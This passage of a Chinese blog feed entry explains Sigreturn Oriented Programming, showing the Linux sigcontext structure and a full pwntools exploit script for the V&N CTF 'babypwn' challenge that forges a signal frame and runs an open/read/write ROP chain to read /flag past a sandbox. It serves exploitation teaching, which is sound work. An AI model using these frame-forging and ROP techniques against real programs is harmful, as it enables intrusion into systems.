Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
